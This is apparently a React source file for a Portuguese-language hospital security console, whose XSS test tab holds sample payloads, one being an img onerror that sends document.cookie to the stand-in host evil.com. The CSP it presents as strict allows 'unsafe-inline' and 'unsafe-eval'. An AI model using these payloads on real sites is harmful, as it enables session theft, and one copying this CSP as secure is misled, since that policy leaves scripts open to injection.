import React, { useState } from 'react';
import {
  Shield,
  Code2,
  Terminal,
  FileCheck,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Layers,
  X,
  Zap,
  Play,
  Cpu,
  Key,
  Database
} from 'lucide-react';
import { AuditLogEntry, User } from '../types';
import { sanitizeInput, XssScanResult } from '../utils/security';

interface SecurityConsoleModalProps {
  currentUser: User;
  auditLogs: AuditLogEntry[];
  onClose: () => void;
}

export const SecurityConsoleModal: React.FC<SecurityConsoleModalProps> = ({
  currentUser,
  auditLogs,
  onClose,
}) => {
  const [activeTab, setActiveTab] = useState<'OVERVIEW' | 'CSP' | 'XSS' | 'ZERO_TRUST' | 'AUDIT'>('OVERVIEW');

  // XSS Interactive Tester State
  const [xssInput, setXssInput] = useState("<script>alert('XSS Hospitalar Malicioso');</script><img src='invalid.jpg' onerror='stealCookies()' />");
  const [scanResult, setScanResult] = useState<XssScanResult>(() => sanitizeInput(xssInput));

  const handleTestXss = (payload: string) => {
    setXssInput(payload);
    setScanResult(sanitizeInput(payload));
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/60 p-4 backdrop-blur-sm">
      <div className="relative flex h-[85vh] w-full max-w-5xl flex-col overflow-hidden rounded-3xl border border-slate-200 bg-white shadow-2xl">
        {/* Top Header */}
        <div className="flex items-center justify-between border-b border-slate-100 bg-slate-50/80 px-6 py-5">
          <div className="flex items-center gap-3.5">
            <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-sky-100 text-sky-700 shadow-xs">
              <Shield size={22} />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="font-display text-base font-bold text-slate-900">
                  Console de Segurança Hospitalar & Arquitetura Zero Trust
                </h2>
                <span className="rounded-full bg-emerald-100 px-2.5 py-0.5 font-mono text-[10px] text-emerald-800 font-bold">
                  CLASSIFIED TIER 1
                </span>
              </div>
              <p className="text-xs text-slate-500 mt-0.5 font-medium">
                Auditoria de conformidade ISO 27799, NIST SP 800-53, LGPD Art. 11 e Defesas Ativas
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="rounded-full p-2 text-slate-400 hover:bg-slate-200 hover:text-slate-700 transition"
          >
            <X size={18} />
          </button>
        </div>

        {/* Navigation Tabs */}
        <div className="flex border-b border-slate-200 bg-slate-50 px-6 text-xs font-bold gap-2 pt-2">
          <button
            onClick={() => setActiveTab('OVERVIEW')}
            className={`flex items-center gap-2 border-b-2 px-4 py-2.5 transition ${
              activeTab === 'OVERVIEW'
                ? 'border-sky-600 text-sky-800 font-bold'
                : 'border-transparent text-slate-500 hover:text-slate-800'
            }`}
          >
            <Layers size={14} />
            Visão Geral de Defesa
          </button>
          <button
            onClick={() => setActiveTab('CSP')}
            className={`flex items-center gap-2 border-b-2 px-4 py-2.5 transition ${
              activeTab === 'CSP'
                ? 'border-sky-600 text-sky-800 font-bold'
                : 'border-transparent text-slate-500 hover:text-slate-800'
            }`}
          >
            <Lock size={14} />
            Headers & CSP Ativo
          </button>
          <button
            onClick={() => setActiveTab('XSS')}
            className={`flex items-center gap-2 border-b-2 px-4 py-2.5 transition ${
              activeTab === 'XSS'
                ? 'border-sky-600 text-sky-800 font-bold'
                : 'border-transparent text-slate-500 hover:text-slate-800'
            }`}
          >
            <Code2 size={14} />
            Laboratório XSS & Sanitização
          </button>
          <button
            onClick={() => setActiveTab('ZERO_TRUST')}
            className={`flex items-center gap-2 border-b-2 px-4 py-2.5 transition ${
              activeTab === 'ZERO_TRUST'
                ? 'border-sky-600 text-sky-800 font-bold'
                : 'border-transparent text-slate-500 hover:text-slate-800'
            }`}
          >
            <Cpu size={14} />
            Sandbox & DDM
          </button>
          <button
            onClick={() => setActiveTab('AUDIT')}
            className={`flex items-center gap-2 border-b-2 px-4 py-2.5 transition ${
              activeTab === 'AUDIT'
                ? 'border-sky-600 text-sky-800 font-bold'
                : 'border-transparent text-slate-500 hover:text-slate-800'
            }`}
          >
            <Terminal size={14} />
            Logs de Auditoria ({auditLogs.length})
          </button>
        </div>

        {/* Tab Body */}
        <div className="flex-1 overflow-y-auto p-6 text-slate-700 custom-scrollbar">
          {/* OVERVIEW */}
          {activeTab === 'OVERVIEW' && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                  <div className="flex items-center gap-2 text-sky-800 text-xs font-bold mb-2">
                    <Shield size={16} />
                    Controle de Acesso RBAC Estrito
                  </div>
                  <p className="text-xs text-slate-600 leading-relaxed">
                    Médicos possuem visão clínica total (CID-10, Histórico, Prescrições). Enfermeiros possuem acesso restrito a <strong>Sinais Vitais</strong> com bloqueio de diagnóstico.
                  </p>
                  <div className="mt-3 flex items-center justify-between font-mono text-[11px] text-emerald-700 font-bold">
                    <span>Status: ATIVO</span>
                    <span>Clearance: {currentUser.clearanceLevel}</span>
                  </div>
                </div>

                <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                  <div className="flex items-center gap-2 text-emerald-800 text-xs font-bold mb-2">
                    <Key size={16} />
                    Mascaramento Dinâmico (DDM)
                  </div>
                  <p className="text-xs text-slate-600 leading-relaxed">
                    Dados pessoais e identificadores genômicos são criptografados com hashes SHA-256 dinâmicos até a assinatura válida do Termo de Sigilo (NDA).
                  </p>
                  <div className="mt-3 font-mono text-[11px] text-sky-700 font-bold">
                    Algoritmo: Pseudo-SHA256 Chained
                  </div>
                </div>

                <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                  <div className="flex items-center gap-2 text-amber-800 text-xs font-bold mb-2">
                    <Zap size={16} />
                    Zero Leakage & Error Sandbox
                  </div>
                  <p className="text-xs text-slate-600 leading-relaxed">
                    Páginas 404 e 500 customizadas eliminam 100% de stack traces, caminhos do servidor ou tecnologias internas, emitindo apenas identificadores de incidentes para o SIEM.
                  </p>
                  <div className="mt-3 font-mono text-[11px] text-amber-800 font-bold">
                    Vazamento de Stack Trace: 0%
                  </div>
                </div>
              </div>

              {/* Architecture Matrix */}
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5 font-mono text-xs">
                <div className="flex items-center justify-between pb-3 border-b border-slate-200 font-bold text-slate-900">
                  <span>MATRIZ DE CAPACIDADES CLASSIFIED BIG TECH:</span>
                  <span className="text-sky-700">NÍVEL 1 HOSPITALAR</span>
                </div>
                <div className="mt-3 grid grid-cols-2 gap-4 text-xs">
                  <div>
                    <div className="text-slate-500 font-semibold">1. Content Security Policy (CSP):</div>
                    <div className="text-slate-700 font-sans mt-0.5">Meta tags com restrição restrita de origens para scripts, conexões e frames.</div>
                  </div>
                  <div>
                    <div className="text-slate-500 font-semibold">2. Proteção Anti-XSS (Input Sanitation):</div>
                    <div className="text-slate-700 font-sans mt-0.5">Filtro de tags HTML, pseudo-protocolos javascript: e injeção de manipuladores de eventos DOM.</div>
                  </div>
                  <div>
                    <div className="text-slate-500 font-semibold">3. Escudo de Privacidade & Anti-Shoulder Surfing:</div>
                    <div className="text-slate-700 font-sans mt-0.5">Bloqueio instantâneo sob demanda ou temporizador de inatividade configurável.</div>
                  </div>
                  <div>
                    <div className="text-slate-500 font-semibold">4. Alertas de Latência & Prevenção de Cliques Duplicados:</div>
                    <div className="text-slate-700 font-sans mt-0.5">Feedback visual de handshake criptográfico prevenindo múltiplos cliques repetitivos.</div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* CSP TAB */}
          {activeTab === 'CSP' && (
            <div className="space-y-4">
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                <h3 className="font-bold text-slate-900 text-sm mb-2 flex items-center gap-2">
                  <Lock size={16} className="text-sky-600" />
                  Diretivas de Content Security Policy (CSP) Injetadas
                </h3>
                <p className="text-xs text-slate-500 mb-3">
                  Configurado via meta tag no cabeçalho do documento para restringir a execução de recursos a origens explicitamente confiáveis.
                </p>
                <div className="rounded-xl bg-white p-3.5 font-mono text-xs text-sky-800 border border-slate-200 select-all overflow-x-auto">
                  <code>
                    default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com data: blob:; img-src 'self' data: https: blob:; font-src 'self' https://fonts.gstatic.com data:; connect-src 'self' https: wss:; frame-ancestors 'self';
                  </code>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                  <h4 className="font-bold text-slate-900 mb-2">Headers Adicionais de Proteção Ativa</h4>
                  <ul className="space-y-2 font-mono text-[11px]">
                    <li className="flex justify-between border-b border-slate-200 pb-1">
                      <span className="text-slate-500">X-Content-Type-Options:</span>
                      <span className="text-emerald-700 font-bold">nosniff</span>
                    </li>
                    <li className="flex justify-between border-b border-slate-200 pb-1">
                      <span className="text-slate-500">X-XSS-Protection:</span>
                      <span className="text-emerald-700 font-bold">1; mode=block</span>
                    </li>
                    <li className="flex justify-between border-b border-slate-200 pb-1">
                      <span className="text-slate-500">Referrer-Policy:</span>
                      <span className="text-emerald-700 font-bold">strict-origin-when-cross-origin</span>
                    </li>
                    <li className="flex justify-between">
                      <span className="text-slate-500">Data Masking Enforcement:</span>
                      <span className="text-sky-700 font-bold">SHA-256 Dynamic DDM</span>
                    </li>
                  </ul>
                </div>

                <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                  <h4 className="font-bold text-slate-900 mb-2">Por que o CSP é Vital na Saúde?</h4>
                  <p className="text-slate-600 leading-relaxed">
                    Prontuários eletrônicos são alvos prioritários de sequestro de dados e ransomware. O CSP impede que um invasor injete scripts em campos de texto de pacientes para extrair credenciais de médicos ou exfiltrar dados sensíveis de pacientes para servidores externos não autorizados.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* XSS LAB TAB */}
          {activeTab === 'XSS' && (
            <div className="space-y-5">
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                <h3 className="font-bold text-slate-900 text-sm mb-1 flex items-center gap-2">
                  <Code2 size={16} className="text-sky-600" />
                  Laboratório de Teste de Injeção XSS & Sanitização em Tempo Real
                </h3>
                <p className="text-xs text-slate-500 mb-4">
                  Teste payloads maliciosos de Cross-Site Scripting comuns em prontuários hospitalares e visualize o mecanismo de neutralização automática.
                </p>

                {/* Predefined payloads */}
                <div className="flex flex-wrap gap-2 mb-4">
                  <span className="text-xs text-slate-500 font-medium self-center">Testar Vetores Comuns:</span>
                  <button
                    onClick={() => handleTestXss("<script>alert('Ataque XSS Executado');</script>")}
                    className="rounded-full border border-slate-300 bg-white px-3 py-1 text-xs text-slate-700 hover:bg-slate-100 font-mono shadow-xs"
                  >
                    &lt;script&gt; Tag
                  </button>
                  <button
                    onClick={() => handleTestXss("<img src=x onerror=\"fetch('https://evil.com/leak?cookie='+document.cookie)\">")}
                    className="rounded-full border border-slate-300 bg-white px-3 py-1 text-xs text-slate-700 hover:bg-slate-100 font-mono shadow-xs"
                  >
                    Image onerror Leak
                  </button>
                  <button
                    onClick={() => handleTestXss("<a href=\"javascript:alert('Roubo de Token')\">Clique para Laudo</a>")}
                    className="rounded-full border border-slate-300 bg-white px-3 py-1 text-xs text-slate-700 hover:bg-slate-100 font-mono shadow-xs"
                  >
                    javascript: URI
                  </button>
                  <button
                    onClick={() => handleTestXss("<iframe src=\"http://fake-hospital.com/login\"></iframe>")}
                    className="rounded-full border border-slate-300 bg-white px-3 py-1 text-xs text-slate-700 hover:bg-slate-100 font-mono shadow-xs"
                  >
                    iFrame Phishing
                  </button>
                </div>

                {/* Input Textarea */}
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-slate-800">
                    Input do Usuário (Entrada Não Confiável):
                  </label>
                  <textarea
                    rows={3}
                    value={xssInput}
                    onChange={(e) => handleTestXss(e.target.value)}
                    className="w-full rounded-2xl border border-slate-300 bg-white p-3.5 font-mono text-xs text-slate-900 placeholder-slate-400 focus:border-sky-500 focus:outline-none"
                    placeholder="Digite ou cole qualquer código HTML/JS..."
                  />
                </div>

                {/* Scan Threat Badges */}
                <div className="mt-3">
                  {scanResult.isClean ? (
                    <div className="inline-flex items-center gap-1.5 rounded-full border border-emerald-300 bg-emerald-100 px-4 py-1.5 text-xs font-bold text-emerald-800">
                      <CheckCircle2 size={14} />
                      Nenhum vetor malicioso detectado. Entrada segura.
                    </div>
                  ) : (
                    <div className="space-y-1.5">
                      <div className="flex items-center gap-1.5 text-xs font-bold text-rose-700">
                        <AlertTriangle size={15} />
                        Ameaças de Injeção Detectadas & Neutralizadas:
                      </div>
                      <div className="flex flex-wrap gap-2">
                        {scanResult.detectedThreats.map((threat, idx) => (
                          <span
                            key={idx}
                            className="rounded-full border border-rose-300 bg-rose-100 px-3 py-1 font-mono text-[11px] font-bold text-rose-800"
                          >
                            ⚠️ {threat}
                          </span>
                        ))}
                      </div>
                    </div>
                  )}
                </div>

                {/* Sanitized Result */}
                <div className="mt-4 space-y-1.5">
                  <label className="text-xs font-bold text-emerald-800 flex items-center justify-between">
                    <span>Saída Sanitizada & Codificada (DOM Entity-Safe):</span>
                    <span className="font-mono text-[10px] text-slate-500">Zero Execution Vector</span>
                  </label>
                  <div className="rounded-2xl border border-emerald-300 bg-white p-3.5 font-mono text-xs text-emerald-800 select-all overflow-x-auto">
                    {scanResult.sanitized}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ZERO TRUST TAB */}
          {activeTab === 'ZERO_TRUST' && (
            <div className="space-y-5">
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-5">
                <h3 className="text-sm font-bold text-slate-900 mb-2 flex items-center gap-2">
                  <Cpu size={16} className="text-sky-600" />
                  Arquitetura Zero Trust & Sandbox Isolado
                </h3>
                <p className="text-xs text-slate-600 leading-relaxed mb-4">
                  O princípio básico do Zero Trust é <em>"Nunca Confie, Sempre Verifique"</em>. Cada interação, leitura de prontuário, medição de sinal vital ou diagnóstico passa por validação contínua de contexto, integridade e credencial.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
                  <div className="rounded-2xl bg-white p-4 border border-slate-200 space-y-2">
                    <div className="text-sky-800 font-bold border-b border-slate-100 pb-1">
                      ESTADO DO SANDBOX DO CLIENTE
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">ID da Sessão Isolada:</span>
                      <span className="text-slate-800">{currentUser.sessionToken.slice(0, 16)}...</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Ambiente de Execução:</span>
                      <span className="text-emerald-700 font-bold">Isolamento em Sandbox</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Assinatura de Integridade:</span>
                      <span className="text-sky-800 font-bold">Válida (SHA-256)</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Política de Redação:</span>
                      <span className="text-amber-700 font-bold">Ativa (Enfermagem Redacted)</span>
                    </div>
                  </div>

                  <div className="rounded-2xl bg-white p-4 border border-slate-200 space-y-2">
                    <div className="text-sky-800 font-bold border-b border-slate-100 pb-1">
                      CICLO DE VIDA DA CREDENCIAL
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Operador Atual:</span>
                      <span className="text-slate-900 font-semibold">{currentUser.name}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Nível de Clearance:</span>
                      <span className="text-emerald-700 font-bold">{currentUser.clearanceLevel}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Auto-Revogação:</span>
                      <span className="text-slate-700">Após 5 min inatividade</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Proteção Anti-Replay:</span>
                      <span className="text-emerald-700 font-bold">Tokens Únicos com Nonce</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* AUDIT LOGS TAB */}
          {activeTab === 'AUDIT' && (
            <div className="space-y-3">
              <div className="flex items-center justify-between mb-2">
                <h3 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                  <Terminal size={16} className="text-sky-600" />
                  Trilha de Auditoria Criptográfica Imutável (SIEM Stream)
                </h3>
                <span className="font-mono text-[11px] text-slate-500 font-semibold">
                  Total de Eventos: {auditLogs.length}
                </span>
              </div>

              <div className="rounded-2xl border border-slate-200 bg-white overflow-hidden shadow-xs">
                <div className="max-h-[50vh] overflow-y-auto divide-y divide-slate-100 font-mono text-xs">
                  {auditLogs.map((log) => (
                    <div key={log.id} className="p-3.5 hover:bg-slate-50 transition">
                      <div className="flex items-center justify-between mb-1">
                        <div className="flex items-center gap-2">
                          <span className={`rounded-full px-2.5 py-0.5 text-[10px] font-bold ${
                            log.outcome === 'GRANTED'
                              ? 'bg-emerald-100 text-emerald-800 border border-emerald-200'
                              : log.outcome === 'DENIED_RBAC'
                              ? 'bg-amber-100 text-amber-800 border border-amber-200'
                              : 'bg-rose-100 text-rose-800 border border-rose-200'
                          }`}>
                            {log.outcome}
                          </span>
                          <span className="font-bold text-slate-900">{log.action}</span>
                          <span className="text-slate-400">→</span>
                          <span className="text-sky-800 font-semibold">{log.resource}</span>
                        </div>
                        <span className="text-[11px] text-slate-500">{log.timestamp}</span>
                      </div>

                      <div className="flex items-center justify-between text-[11px] text-slate-500 mt-1">
                        <div>
                          Ator: <strong className="text-slate-800">{log.actor}</strong> ({log.actorRole}) • IP: <span className="text-slate-600">{log.ipAddress}</span>
                        </div>
                        <div className="text-[10px] text-slate-400 truncate max-w-[200px]" title={log.sha256Proof}>
                          Proof: {log.sha256Proof.slice(0, 16)}...
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

        </div>

        {/* Bottom Footer */}
        <div className="flex items-center justify-between border-t border-slate-100 bg-slate-50/80 px-6 py-3.5 text-xs text-slate-500 font-medium">
          <span className="flex items-center gap-1.5">
            <Database size={14} className="text-sky-600" />
            Criptografia de Repouso AES-256-GCM • Transmissão TLS 1.3
          </span>
          <button
            onClick={onClose}
            className="rounded-full bg-slate-200 px-5 py-1.5 text-xs font-bold text-slate-800 hover:bg-slate-300 transition"
          >
            Fechar Console
          </button>
        </div>
      </div>
    </div>
  );
};
